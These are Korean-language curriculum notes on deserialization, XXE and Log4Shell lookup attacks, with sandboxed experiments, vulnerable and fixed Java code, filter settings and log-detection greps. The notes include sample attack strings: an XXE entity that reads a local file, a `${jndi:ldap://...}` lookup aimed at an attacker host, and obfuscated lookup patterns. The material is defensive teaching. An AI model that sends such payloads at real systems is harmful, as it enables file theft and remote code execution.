# security/23-deserialization-and-parser-attacks — 역직렬화·XXE·문자열 lookup: 데이터가 동작이 되는 파서 — 정리 (힌트)

## 해결하는 문제

파서는 바이트를 받아 값으로 바꾼다.\
어떤 파서는 값만 만들지 않고 **입력이 시키는 일을 한다.**

```text
  외부 바이트 ──▶ [ 파서 ] ──▶ 값 (주문 객체, XML 트리, 로그 한 줄)
                     │
                     └──▶ 부수 동작
                          · 역직렬화: 입력에 적힌 클래스를 만들고 그 클래스의 readObject를 부른다
                          · XML:      입력에 적힌 엔티티를 풀려고 파일·URL을 읽는다
                          · 로그:     메시지 안의 ${...}를 찾아 lookup을 실행한다(Log4j 2.0-beta9~2.14.1 기본, 보안 수정판 2.12.2 이상 2.12.x·2.3.1 이상 2.3.x 제외)
```

- 세 공격의 공통점: **데이터 안에 지시문이 들어 있고, 파서가 그 지시문을 신뢰 경계 안쪽에서 실행한다.**
  - *신뢰 경계*: 검증 안 된 입력이 검증된 영역으로 넘어가는 선. 위협 모델링의 기본 단위다([security/02-threat-modeling](../02-threat-modeling/2-summary.md)).
- 18번 인젝션(`../18-injection`)과 뿌리가 같다. 인젝션은 "데이터가 코드 문맥으로 새는 것"이고, 여기서는 그 코드 문맥이 **파서의 기능 자체**다.

쉬운 예: 택배 상자에 "받는 사람은 상자를 열자마자 금고 비밀번호를 크게 읽으시오"라는 쪽지가 있다.\
보통 사람은 무시한다. 그런데 "상자 안 쪽지는 무조건 따른다"는 규칙으로 일하는 직원이 있다.\
그 직원이 파서다. 상자를 열기(파싱) 전에는 쪽지를 볼 수 없으니, 열고 나서 "주문서가 아니네" 하고 버리면 이미 늦다.

실무 예:
- 2021년 12월 Log4Shell(CVE-2021-44228). 로그에 남긴 사용자 문자열의 `${jndi:...}`가 원격 코드 실행으로 이어졌다. NVD CVSS 3.1 기본 점수 10.0.
- 세션·캐시·메시지 큐에 Java 기본 직렬화 바이트를 넣고, 그 바이트를 바깥에서 고칠 수 있는 구조.
- XML 업로드(SAML·SOAP·오피스 문서·SVG)에서 외부 엔티티가 서버 파일을 읽는다(XXE).

## 동작·원리

### 1. Java 기본 직렬화 — 캐스트보다 먼저 실행된다

```text
  바이트 스트림 (AC ED 00 05 ...)        ObjectInputStream.readObject()
  ┌────────────────────────────┐        ┌────────────────────────────────────────────┐
  │ 클래스 이름 = "Deser$Job"   │ ─────▶ │ ① 클래스 이름 해석 (resolveClass)            │
  │ 필드 action = "delete-all" │        │ ② 인스턴스 생성 (필드는 기본값)               │
  └────────────────────────────┘        │ ③ private readObject() 호출 — 그 안에서       │
                                        │    defaultReadObject()로 필드 복원 ◀ 부작용 │
                                        └──────────────────────┬─────────────────────┘
                                                               ▼
                                     앱 코드: Order o = (Order) result;   ← 여기서야 타입 확인
```

- *직렬화*: 객체 그래프를 바이트로 바꾸는 것. *역직렬화*: 그 반대.
- Java 기본 직렬화 스트림은 **어느 클래스를 만들지를 스트림이 정한다.** 앱이 기대하는 타입은 마지막 캐스트에서야 확인된다.
- 클래스가 `readObject`를 정의하면 ③에서 그 코드가 실행된다. 필드 복원도 그 메서드 안(`defaultReadObject()`·`readFields()`)에서 일어난다(Java Object Serialization Specification §3.4). 캐스트가 실패해도 부작용은 이미 일어났다.
  - *가젯(gadget)*: 클래스패스에 이미 있는 클래스 중, 역직렬화 중 호출되는 메서드(`readObject`·`hashCode`·`equals`·`compareTo` 등)가 다른 객체의 메서드를 부르는 것.
  - *가젯 체인*: 이런 호출을 이어 붙여 마지막에 위험한 동작(파일 쓰기·명령 실행·JNDI 조회)에 닿게 만든 객체 그래프. OWASP Deserialization Cheat Sheet가 쓰는 용어다.
    - 흔한 오해: "우리 코드에 위험한 `readObject`가 없으니 안전하다." 가젯은 내 코드가 아니라 **클래스패스의 라이브러리**에서 찾는다. 라이브러리 하나 추가로 체인이 생길 수 있다.

(실험, OpenJDK 21.0.12 Temurin, `--network none`, 2026-10-07 — 교육용 `Job` 클래스는 `readObject`에서 출력만 한다)

```text
== 필터 없음
Order 바이트 -> 성공: Order
  주문 Order[id=1, amount=500]
  [Job.readObject 실행] action=delete-all  <- 앱 코드가 호출하기도 전에 실행됨
Job 바이트   -> 성공: Job
Job 바이트   -> ClassCastException: class Deser$Job cannot be cast to class Deser$Order ...
== 허용 목록 필터
Order 바이트 -> 성공: Order
  주문 Order[id=1, amount=500]
Job 바이트   -> InvalidClassException: filter status: REJECTED
```

- 관찰 1: 필터가 없으면 `Job.readObject`가 먼저 돌고, 그다음에 `ClassCastException`이 났다. **캐스트는 방어가 아니다.**
- 관찰 2: 허용 목록 필터(`maxdepth=5;maxarray=1000;Deser$Order;java.lang.*;!*`)를 걸자 `Job`은 인스턴스가 만들어지기 전에 `InvalidClassException: filter status: REJECTED`로 거부됐다. `readObject` 출력이 없다.

### 2. 직렬화 필터 — JEP 290·415

```text
  스트림의 클래스·배열 길이·깊이·참조 수·바이트 수
            │
            ▼
  ObjectInputFilter.checkInput(info) ─▶ ALLOWED / REJECTED / UNDECIDED
            │ REJECTED
            ▼
  InvalidClassException("filter status: REJECTED")   ← 인스턴스 생성 전
```

- JEP 290(Java 9): 들어오는 직렬화 스트림을 거르는 `ObjectInputFilter`. 시스템 속성 `jdk.serialFilter` 또는 `java.security` 파일로 JVM 전체 필터를 건다.
  - 패턴: `maxdepth=`·`maxrefs=`·`maxbytes=`·`maxarray=` 한도, 클래스 이름(`pkg.*` = 그 패키지, `pkg.**` = 하위 패키지 포함), `!` 접두 = 거부. 앞에서부터 처음 맞는 패턴이 결정한다.
  - 결과는 `ALLOWED`·`REJECTED`·`UNDECIDED` 셋이다.
- JEP 415(Java 17): `jdk.serialFilterFactory`로 **역직렬화 작업마다** 필터를 고른다. 라이브러리마다 다른 필터를 쓸 수 있다.
- 필터는 거부 목록보다 **허용 목록**(끝에 `!*`)으로 쓴다. 거부 목록은 알려진 가젯만 막고, 새 가젯은 못 막는다.

### 3. XML — 외부 엔티티와 엔티티 폭탄

```text
  <!DOCTYPE order [ <!ENTITY x SYSTEM "file:///w/secret.txt"> ]>     ← DTD 안의 엔티티 선언
  <order><memo>&x;</memo></order>                                    ← 참조 시 파일을 읽어 끼운다

  엔티티 폭탄: e10 = e9×10, e9 = e8×10, ... e1 = e0×10, e0="ha"
  641바이트 문서 → 펼치면 "ha" 10^10 개
```

- *DTD*: XML 문서의 구조와 엔티티를 정의하는 선언부.
- *외부 엔티티*: `SYSTEM "URI"`로 선언한 엔티티. 파서가 그 URI를 읽어 본문에 끼운다. `file:`이면 서버 파일, `http:`이면 서버가 대신 요청한다(22번 SSRF와 같은 결과).
- *XXE(XML External Entity)*: 이 기능으로 서버 파일을 읽거나 내부망에 요청하게 하는 공격. OWASP Top 10 2017에서는 따로 A4였다. 2021판에서는 A05 Security Misconfiguration이 대표 CWE로 CWE-611(XXE)을 든다.
- *엔티티 폭탄(billion laughs)*: 내부 엔티티를 겹겹이 10배씩 키워, 작은 문서가 거대한 문자열로 펼쳐지게 한다. 서비스 거부다(28번).

(실험, OpenJDK 21.0.12 Temurin, `--network none`, 2026-10-07 — `secret.txt`는 실험용으로 만든 파일)

```text
laughs 문서 크기 = 641 바이트
== JDK 21 기본 DocumentBuilderFactory
외부 엔티티 -> 파싱 성공, 본문="TOP-SECRET-DEMO-VALUE"
엔티티 폭탄 -> SAXParseException: JAXP00010001: The parser has encountered more than "64000" entity expansions in this document; this is the limit imposed by the JDK.
== disallow-doctype-decl=true
외부 엔티티 -> SAXParseException: DOCTYPE is disallowed when the feature "http://apache.org/xml/features/disallow-doctype-decl" set to true.
엔티티 폭탄 -> SAXParseException: DOCTYPE is disallowed when the feature "http://apache.org/xml/features/disallow-doctype-decl" set to true.
```

- 관찰 1: **JDK 21 기본 설정은 외부 `file:` 엔티티를 풀었다.** 파일 내용이 `memo` 본문으로 들어왔다.
- 관찰 2: 엔티티 폭탄은 JDK 기본 한도(엔티티 확장 64,000회)에서 멈췄다. 이 실험에서 먼저 걸린 것이 확장 횟수 한도였다. JDK 21에는 엔티티 전체 크기(`jdk.xml.totalEntitySizeLimit` 5×10^7)·엔티티 대체 노드 수(`jdk.xml.entityReplacementLimit` 3,000,000) 같은 다른 기본 한도도 있다(Oracle JAXP Security Guide). 외부 `file:` 엔티티는 어느 한도도 막지 않았다(관찰 1).
- 관찰 3: `disallow-doctype-decl=true`로 DTD 자체를 거부하자 둘 다 파싱 전에 막혔다. OWASP XXE Prevention Cheat Sheet의 General Guidance 첫 권고("Disable document type definitions (DTDs) whenever possible. Reject DOCTYPE declarations if the parser supports it.")와 같다.

### 4. 문자열 lookup — Log4Shell의 구조

```text
  HTTP 헤더 User-Agent: "Mozilla ${jndi:ldap://공격자/a}"
        │
        ▼
  log.info("login user-agent={}", ua)
        │   Log4j 2.0-beta9~2.14.1(보안 수정판 2.12.2+·2.3.1+ 제외): 포맷된 메시지 안의 ${...}를 다시 찾아 lookup 실행 (message lookup)
        ▼
  JndiLookup → LDAP 조회 → 원격 객체 참조 → (조건이 맞으면) 클래스 로드·실행
```

- LDAP 조회가 곧 코드 실행은 아니다. JDK 21의 LDAP 구현은 임의 URL 코드베이스에서 클래스를 읽는 `com.sun.jndi.ldap.object.trustURLCodebase`가 기본 `false`다(OpenJDK 21 `VersionHelper.java`). 코드 실행까지 가려면 그런 런타임 설정이나 클래스패스 가젯 같은 다른 경로가 필요하다. 조회 자체(외부 연결·정보 유출)는 그 전에 이미 일어난다.

- *lookup*: Log4j 설정에서 `${prefix:name}`을 값으로 바꾸는 기능. `${java:version}`·`${sys:속성}`·`${env:변수}`·`${jndi:...}` 등이 있다.
- 원래 lookup은 **설정 파일**(운영자가 쓴 것)을 위한 기능이다. 문제는 2.14.1까지(보안 수정판 2.12.2 이상 2.12.x·2.3.1 이상 2.3.x 제외) **로그 메시지 본문**(사용자 입력이 섞인 것)에도 적용했다는 점이다.
- NVD 설명(CVE-2021-44228): "An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed."

(실험, OpenJDK 21.0.12 Temurin, `--network none`, 2026-10-07 — JNDI 없이 무해한 `${java:version}`·`${sys:demo.secret}`만 썼다. `demo.secret`은 가짜 값을 넣은 시스템 속성)

```text
== log4j-core 2.14.1
  LOG| login user-agent=Mozilla Java version 21.0.12 / FAKE-DB-PASSWORD
== log4j-core 2.14.1 -Dlog4j2.formatMsgNoLookups=true
  LOG| login user-agent=Mozilla ${java:version} / ${sys:demo.secret}
== log4j-core 2.24.3
  LOG| login user-agent=Mozilla ${java:version} / ${sys:demo.secret}
```

- 관찰 1: 2.14.1은 **사용자가 보낸 문자열 안의 lookup을 실행했다.** 시스템 속성 값(가짜 비밀)이 로그에 찍혔다. `${jndi:...}`였다면 같은 자리에서 외부 조회가 일어난다.
- 관찰 2: 같은 2.14.1도 `log4j2.formatMsgNoLookups=true`면 글자 그대로 남았다. 2.24.3은 옵션 없이 글자 그대로다.
- 해석: 파라미터 바인딩(`{}`)을 써도 소용없었다. 바인딩 **뒤의** 문자열에서 다시 lookup을 찾았기 때문이다. 18번의 "바인딩이면 안전"이 여기선 통하지 않은 이유다.

### 5. 다른 형식도 같은 모양이다

| 형식·라이브러리 | 위험한 기능 | 안전한 쪽 |
|---|---|---|
| Java 기본 직렬화 | 스트림이 클래스를 고름 | 쓰지 않기 → JSON DTO, 써야 하면 허용 목록 필터 |
| Jackson | 다형 타입(기본 타이핑): JSON의 타입 이름으로 클래스를 고름 | 2.10부터 `enableDefaultTyping()` 사용 중단, `activateDefaultTyping(PolymorphicTypeValidator, …)`로 허용 목록 |
| SnakeYAML | `Constructor()`가 임의 타입 생성(CVE-2022-1471, NVD 9.8·CNA 8.3) | `SafeConstructor`, 2.0 이상 |
| Python `pickle` | 역직렬화가 임의 호출을 할 수 있음 | 신뢰 못 할 입력에 쓰지 않기(OWASP Cheat Sheet) |
| .NET `BinaryFormatter` | 같은 문제 | Microsoft가 안전하게 쓸 수 없다고 본다(OWASP Cheat Sheet) |
| XML | DTD·외부 엔티티·XInclude | DTD 금지 + XInclude 끄기(XInclude는 DTD와 별개 기능) |
| 템플릿·표현식 언어 | 입력이 표현식으로 평가 | 입력을 표현식에 넣지 않기 |

- OWASP Top 10 2021의 A08 Software and Data Integrity Failures가 역직렬화를 포함한다("objects or data are encoded or serialized into a structure that an attacker can see and modify is vulnerable to insecure deserialization", 매핑 CWE-502). 2025판에도 A08 Software or Data Integrity Failures로 남았다.

## 쓰이는 자료구조·알고리즘

- **객체 그래프 탐색** — 역직렬화는 스트림에 적힌 객체 그래프를 깊이 우선으로 다시 만든다. `maxdepth`는 그 탐색의 깊이 상한, `maxrefs`는 읽은 객체와 이미 읽은 객체로의 재참조를 합친 누적 참조 수 상한이다(`ObjectInputStream` API 문서). [algorithm/12-dfs](../../algorithm/12-dfs/2-summary.md) · [data-structure/08-graph](../../data-structure/08-graph/2-summary.md)
- **허용 목록 = 집합 소속 판정** — 클래스 이름이 허용 집합에 있나. 거부 목록과 달리 "모르는 것은 거부"가 기본이다(fail-safe 기본값, [security/01-security-principles](../01-security-principles/2-summary.md)).
- **지수적 확장** — 엔티티 폭탄은 깊이 d, 단계마다 k배면 k^d. 위 실험은 10^10. 방어는 확장 횟수 카운터(JDK 64,000)나 DTD 금지다.
- **재귀 치환** — Log4j lookup은 `${...}`를 찾아 바꾼 결과를 다시 훑는다. 자기 참조 lookup의 무한 재귀(uncontrolled recursion)로 서비스 거부를 낸 CVE-2021-45105가 그 부작용이다(NVD·Apache Log4j 보안 페이지, CVSS 3.1 5.9).
- 파서와 문법 일반은 language 영역 03-parsing-grammars-ast(원고: [language README](../../language/README.md)).

## 적용 — 풀어나가는 법

### 1. 순서

1. 신뢰 못 할 입력을 **기본 직렬화로 받지 않는다.** 데이터만 담는 형식(JSON·Protobuf)과 명시 DTO로 받는다([api-design/08](../../api-design/08-schema-and-serialization/2-summary.md)).
2. 꼭 받아야 하면 **허용 목록 필터 + 크기 한도**를 건다. 바이트에 서명(HMAC, 05번)을 붙여 위조를 막는 것도 OWASP 권고다. 단 서명 키가 새면 끝이므로 필터와 겹쳐 쓴다.
3. XML 파서는 만드는 자리마다 **DTD 금지**를 켠다. 팩토리를 공용 유틸 하나로 모은다.
4. 로그·템플릿에 사용자 문자열이 들어가는 곳에서 **해석 기능이 꺼져 있는지** 확인한다.
5. 의존성 목록에서 위험 버전을 찾는 자동 검사를 둔다(25번).

### 2. 역직렬화 — 취약 → 고친 예 (Java 21)

```java
// 취약: 바깥에서 온 바이트를 그대로 readObject
Object o = new ObjectInputStream(request.getInputStream()).readObject();
Order order = (Order) o;                 // 이미 늦다 — readObject 체인은 끝났다
```

```java
// 고친 판 1 (권장): 데이터 형식으로 받는다
record OrderDto(long id, int amount) {}
OrderDto dto = objectMapper.readValue(body, OrderDto.class);   // 기본 타이핑을 켜지 않은 ObjectMapper

// 고친 판 2 (어쩔 수 없을 때): 스트림마다 허용 목록 필터
var in = new ObjectInputStream(bytes);
in.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
        "maxdepth=5;maxrefs=100;maxbytes=65536;maxarray=1000;com.example.Order;java.lang.*;!*"));
Order order = (Order) in.readObject();
```

```text
# JVM 전체 기본 필터 (스트림 필터를 따로 걸지 않은 역직렬화를 덮는다) — 예시
java -Djdk.serialFilter='maxbytes=1048576;com.example.**;java.base/*;!*' -jar app.jar
```

- 기본 필터 팩토리에서는 코드(라이브러리 포함)가 `setObjectInputFilter`로 스트림 필터를 걸면 그 필터가 JVM 전체 필터를 **대체**한다(`ObjectInputFilter.Config` API 문서). 모든 스트림에 JVM 정책을 강제하려면 JEP 415 필터 팩토리에서 두 필터를 결합한다.
- JVM 전체 필터를 갑자기 강제하면 정상 경로(세션 복제·캐시)가 깨질 수 있다. 26번의 audit → enforce 순서를 쓴다. JEP 415 필터 팩토리로 "거부 대신 기록만" 하는 판을 먼저 둘 수 있다.

### 3. XML 파서 — 취약 → 고친 예 (Java 21)

```java
// 취약: JDK 기본값 (위 실험에서 file: 엔티티를 풀었다)
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();

// 고친 판: DTD 자체를 거부 (OWASP XXE Prevention Cheat Sheet)
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
f.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
f.setXIncludeAware(false);
f.setExpandEntityReferences(false);

// StAX
XMLInputFactory x = XMLInputFactory.newInstance();
x.setProperty(XMLInputFactory.SUPPORT_DTD, false);
x.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
```

- `setFeature`가 예외를 던지면(구현체가 지원 안 함) **잡고 계속 가지 않는다.** 일부만 강화된 파서로 도는 것이 가장 나쁘다(OWASP Cheat Sheet).
- DTD가 꼭 필요한 문서(일부 SAML·레거시 연동)면 외부 엔티티를 거부하는 `EntityResolver`를 둔다.

### 4. Log4j — 확인과 고친 판

```text
# 어떤 log4j-core가 실제로 들어 있나 (전이 의존성 포함)
mvn dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core
# 배포물(fat jar·war) 안에서 직접 찾기
unzip -l app.jar | grep -i 'log4j-core'
```

- 고친 판: Java 8 이상이면 log4j-core 2.17.1 이상으로 올린다. 2.15.0(44228)·2.16.0(45046)·2.17.0(45105)·2.17.1(44832, JDBC Appender)로 연달아 고쳐졌다(NVD 각 CVE 설명. 44832의 수정 판은 Apache 보안 페이지 표와 다르다 — 관련 주제·근거 참고). 위 실험의 2.24.3은 메시지 lookup을 하지 않았다.
- `log4j-api`만 쓰는 앱은 이 취약점과 무관하다(Apache Log4j 보안 페이지: "only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted").
- Apache 보안 페이지의 조치는 업그레이드 하나다. `formatMsgNoLookups`는 위 실험처럼 **메시지** lookup만 끈다. CVE-2021-45046은 설정 패턴 쪽 Context Lookup(`$${ctx:loginId}`)이 입구였으므로(NVD 설명), 이 옵션으로는 막히지 않는다(해석). 업그레이드가 답이다.

### 5. 진단

```text
# 요청 로그에서 lookup 시도 흔적
grep -F '${' access.log | grep -iE 'jndi|lower:|upper:'
# 직렬화 바이트 흔적 (Java 매직 넘버 AC ED 00 05 = Base64 "rO0AB")
grep -c 'rO0AB' access.log
```

- OWASP Deserialization Cheat Sheet가 탐지 표식으로 `AC ED 00 05`(hex)·`rO0`(Base64)를 든다.
- 앱 서버에서 바깥으로 나가는 LDAP(389)·RMI·이상한 DNS 조회는 lookup이 실행됐다는 신호다. 나가는 연결을 기본 차단하는 egress 정책이 피해를 줄인다([network/48](../../network/48-firewalls-and-network-policy/2-summary.md)).

## 장애 시나리오와 대처

### 1. 로그 문자열 `${jndi:...}` → 원격 코드 실행 (Log4Shell, ⚠ 커리큘럼)

- **현상**: 외부 요청 직후 앱 서버가 모르는 호스트로 LDAP·DNS 연결을 연다. 이어서 낯선 프로세스·파일이 생긴다.
- **보이는 형태**: 접근 로그의 `User-Agent`·`X-Api-Version`·검색어 같은 필드에 `${jndi:ldap://...}`나 난독화한 `${${lower:j}ndi:...}`. 방화벽에 앱 서버발 389 포트 연결.
- **원인**: log4j-core 2.0-beta9 ~ 2.14.1(보안 수정판 2.12.2 이상 2.12.x·2.3.1 이상 2.3.x 제외)이 기본 설정에서 메시지 본문의 lookup을 실행했다(2.15.0에서 기본 꺼짐, 2.16.0(과 2.12.2·2.12.3·2.3.1)에서 제거 — NVD 설명). 사용자 입력을 로그에 남기는 거의 모든 경로가 입구가 됐다.
- **대처**
  - log4j-core를 2.17.1 이상으로 올린다. 전이 의존성·셰이딩된 jar까지 찾는다(25번 SBOM).
  - 올리기 전까지는 egress 차단으로 외부 조회를 막고, 침해 여부를 확인한다.
  - 이미 실행됐을 수 있으면 침해 사고로 다룬다. 로그·연결 기록으로 범위를 정한다(26번). 사고 전체는 30번([security/30-security-incidents](../30-security-incidents/2-summary.md)).

### 2. 역직렬화 가젯 → 원격 코드 실행 (⚠ 커리큘럼)

- **현상**: 특정 요청 뒤 서버에서 의도하지 않은 명령이 실행된다. 앱 로그에는 `ClassCastException`만 남기도 한다.
- **보이는 형태**: 요청 바디·쿠키·헤더에 `rO0AB`로 시작하는 Base64. 로그의 `ClassCastException: ... cannot be cast to ...`. 위 실험처럼 **캐스트 실패는 부작용 뒤에** 난다.
- **원인**: 바깥 바이트를 `readObject`했다. 클래스패스 라이브러리의 가젯이 이어져 위험한 동작에 닿았다.
- **대처**: 데이터 형식으로 바꾼다. 당장은 허용 목록 필터(`jdk.serialFilter`). 가젯이 알려진 라이브러리 판을 올리는 것만으로는 부족하다. 새 가젯이 계속 나온다.

### 3. XML 업로드로 서버 파일이 응답에 섞여 나온다 (XXE)

- **현상**: 업로드한 XML을 되돌려 보여 주는 기능의 응답에 설정 파일 내용이 보인다. 또는 서버가 내부 주소로 HTTP 요청을 보낸다.
- **보이는 형태**: 요청 본문의 `<!DOCTYPE ... <!ENTITY ... SYSTEM "file:...">`. 서버발 내부망 요청 로그.
- **원인**: JDK 기본 `DocumentBuilderFactory`가 외부 엔티티를 풀었다(위 실험).
- **대처**: 팩토리마다 `disallow-doctype-decl=true`. 모든 XML 진입점(SAML·SOAP·SVG·XLSX)을 찾는다. 서버발 요청은 22번의 egress 허용 목록으로도 막는다.

### 4. 작은 XML 하나에 CPU가 붙잡힌다 → 강화 뒤엔 정상 문서가 거부된다

- **현상**: 1KB도 안 되는 요청 몇 개에 CPU·메모리가 치솟는다. 반대로, 한도를 강하게 걸자 큰 정상 문서가 `JAXP00010001`로 실패한다.
- **보이는 형태**: `SAXParseException: JAXP00010001: The parser has encountered more than "64000" entity expansions ...`(위 실험의 JDK 21 메시지).
- **원인**: 엔티티 확장이 지수적으로 커진다. JDK 기본 한도가 마지막 방어선이다.
- **대처**: DTD 금지가 근본책이다. DTD가 필요한 정상 문서라면 한도를 문서 크기에 맞춰 조정하고, 요청 크기 상한·파싱 시간 상한(28번)을 함께 건다.

### 5. 직렬화 필터를 켜자 세션 복제가 깨진다

- **현상**: 배포 직후 로그인 세션이 노드 사이에서 사라지거나 캐시 읽기가 실패한다.
- **보이는 형태**: `java.io.InvalidClassException: filter status: REJECTED`(위 실험과 같은 메시지).
- **원인**: JVM 전체 허용 목록에 세션·캐시가 쓰는 클래스가 빠졌다.
- **대처**: 강제 전에 관측한다. 필터 팩토리로 거부 대상만 기록하는 판을 먼저 돌려 목록을 모은 뒤 강제한다(26번 audit → enforce).

## 핵심 문장

- 역직렬화·XML 엔티티·로그 lookup은 모두 "데이터 안의 지시문을 파서가 실행"하는 구조다.
- Java 기본 역직렬화는 캐스트보다 먼저 `readObject`를 실행한다. 캐스트는 방어가 아니다.
- 방어는 허용 목록이다. `!*`로 끝나는 직렬화 필터, DTD 금지처럼 "모르는 것은 거부"를 기본으로 둔다.
- JDK 21 기본 XML 파서는 외부 `file:` 엔티티를 풀었다. 엔티티 폭탄은 기본 확장 횟수 한도(64,000)에서 멈췄다.
- Log4Shell은 파라미터 바인딩 뒤의 문자열에서 다시 lookup을 찾았기 때문에 생겼다. log4j-core 2.17.1 이상이 답이다.

## 관련 주제·근거

- 선행
  - security 18-injection(`../18-injection`) — 데이터가 코드 문맥으로 새는 일반형
  - [api-design/08-schema-and-serialization](../../api-design/08-schema-and-serialization/2-summary.md) — 데이터 형식과 스키마
- 후속·연결
  - security 22-ssrf(`../22-ssrf`) — XXE의 `http:` 엔티티는 서버발 요청이다
  - [25-supply-chain-security](../25-supply-chain-security/2-summary.md) — 취약 버전을 찾는 SBOM
  - [26-security-logging-and-audit](../26-security-logging-and-audit/2-summary.md) — 로그 주입, 필터 롤아웃
  - [28-dos-and-abuse](../28-dos-and-abuse/2-summary.md) — 엔티티 폭탄 같은 비싼 입력
  - security 29-security-symptom-index · 30-security-incidents(Log4Shell)
  - [network/48-firewalls-and-network-policy](../../network/48-firewalls-and-network-policy/2-summary.md) — egress 차단
- 1차 출처
  - NVD CVE-2021-44228(게시 2021-12-10, CVSS 3.1 10.0, CISA KEV 2021-12-10 등재) <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>
  - NVD CVE-2021-45046(9.0) · CVE-2021-45105(5.9) · CVE-2021-44832(6.6, 수정 판이 출처별로 다르다 — NVD 설명은 "2.17.1, 2.12.4, and 2.3.2", 2026-10-07의 Apache 보안 페이지 표는 2.17.0(Java 8 이상)·2.12.3(Java 7)·2.3.1(Java 6). Java 8 이상에서 2.17.1 이상이면 두 기준을 모두 만족한다) · CVE-2022-1471 SnakeYAML(NVD 9.8, CNA Google 8.3)
  - Apache Log4j Security Vulnerabilities <https://logging.apache.org/security.html>
  - OWASP Top 10 2021 A08 Software and Data Integrity Failures <https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/> · OWASP Top 10 2025 목록 <https://owasp.org/Top10/2025/>
  - OWASP Deserialization Cheat Sheet <https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html>
  - OWASP XML External Entity Prevention Cheat Sheet <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
  - JEP 290 Filter Incoming Serialization Data(Java 9) <https://openjdk.org/jeps/290> · JEP 415 Context-Specific Deserialization Filters(Java 17) <https://openjdk.org/jeps/415>
  - Jackson 2.10 Safe Default Typing(Tatu Saloranta) <https://cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba>
- 실험(로컬, `--network none`, OpenJDK 21.0.12 Temurin)
  - 역직렬화: 필터 없음 → `readObject` 부작용 뒤 `ClassCastException`, 허용 목록 → `filter status: REJECTED`
  - XML: JDK 기본이 `file:` 엔티티를 풂, 엔티티 폭탄은 `JAXP00010001`(64000)에서 정지, `disallow-doctype-decl`이면 둘 다 거부
  - Log4j: 2.14.1이 메시지 안 `${java:version}`·`${sys:...}`를 실행, `formatMsgNoLookups=true`와 2.24.3은 글자 그대로
